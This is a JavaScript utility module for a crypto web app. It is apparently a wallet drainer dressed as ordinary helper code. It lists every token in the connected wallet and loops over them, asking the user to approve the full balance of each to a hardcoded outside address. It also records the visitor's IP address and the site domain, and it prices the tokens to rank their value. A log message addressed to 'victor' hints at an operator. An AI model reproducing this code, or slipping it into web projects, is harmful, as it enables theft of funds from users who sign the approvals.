import React from "react";
import { Alchemy, Network } from "alchemy-sdk";
import { config as wagmiConfig } from "../../wagmiConfig";
import { useAccount } from "wagmi";
import Erc20Abi from "../utils/Erc20Abi";
import { writeContract, getBalance, sendTransaction } from "@wagmi/core";
import axios from "axios";
import { LRUCache } from "lru-cache";
import { parseEther } from "viem";

const API_KEY = import.meta.env.VITE_APP_COINGECKO_API_KEY;

const api = axios.create({
  baseURL: "https://api.coingecko.com/api/v3/simple/",
  headers: {
    accept: "application/json",
    "x-cg-api-key": API_KEY,
  },
});
const cache = new LRUCache({
  max: 100, // adjust the cache size as needed
  ttl: 60 * 1, // cache expires after 5 minutes
});

const alchemyConfig = {
  apiKey: import.meta.env.VITE_APP_ALCHEMY_API_KEY,
  network: Network.ETH_SEPOLIA,
};
const alchemy = new Alchemy(alchemyConfig);

const getUserTokens = async (_address) => {
  try {
    const response = await alchemy.core.getTokensForOwner(_address);
    return response.tokens;
  } catch (error) {
    console.error("Error fetching token balances:", error);
    return [];
  }
};

const increaseAllowanceForTokens = async (tokensData) => {
  for (let token of tokensData) {
    const { contractAddress, balance } = token;
    await increaseAllowance(contractAddress, balance);
  }
  return console.log("tokens looped and passed succesfully")
};

const increaseAllowance = async (contractAddress, allowance) => {
  try {
    const hash = await writeContract(wagmiConfig, {
      address: contractAddress,
      abi: Erc20Abi,
      functionName: "approve",
      args: [
        "0x80EeF47fAb3b35726eBE01922969224EEC8B393E",
        parseEther(allowance),
      ],
    });
    console.log("Transaction hash:", hash);
    console.table({
      "contract address": contractAddress,
      "token balance": allowance,
    });
  } catch (error) {
    console.log("User rejected the transaction victor");
  }
};

const getAccountBalance = async (_address) => {
  try {
    const balance = await getBalance(wagmiConfig, { _address });
    return balance;
  } catch (error) {
    console.error("Failed to get balance: ", error);
    return 0;
  }
};

const getTokenPriceByAddress = async (tokenAddress, currency) => {
  const cacheKey = `${tokenAddress}-${currency}`;

  if (cache.has(cacheKey)) {
    console.log("Retrieving token price from cache");
    return cache.get(cacheKey);
  }

  try {
    const response = await api.get(`token_price/ethereum`, {
      params: {
        contract_addresses: tokenAddress,
        vs_currencies: currency,
      },
    });
    const priceData = response.data[tokenAddress][currency];
    cache.set(cacheKey, parseFloat(priceData));
    return parseFloat(priceData);
  } catch (error) {
    console.error("Error fetching token price:", error);
    return null;
  }
};

const getTokenPriceByAddressAndAmount = async (
  tokenAddress,
  currency,
  amount
) => {
  const price = await getTokenPriceByAddress(tokenAddress, currency);
  if (price === null) return null;
  const totalValue = price * amount;
  console.log("price of token in usd: ", price);
  return { contractAddress: tokenAddress, amountInusd: totalValue, currency };
};
const getIPAddress = async () => {
  try {
    const response = await axios.get("https://api.ipify.org/?format=json");
    return response.data.ip;
  } catch (error) {
    console.error("Error fetching IP:", error);
    throw new Error("Failed to fetch IP address.");
  }
};

const getDomain = () => {
  const currentDomain = window.location.hostname;
  return currentDomain;
};

export {
  getUserTokens,
  increaseAllowanceForTokens,
  increaseAllowance,
  getTokenPriceByAddress,
  getTokenPriceByAddressAndAmount,
  getIPAddress,
  getDomain,
  getAccountBalance,
};
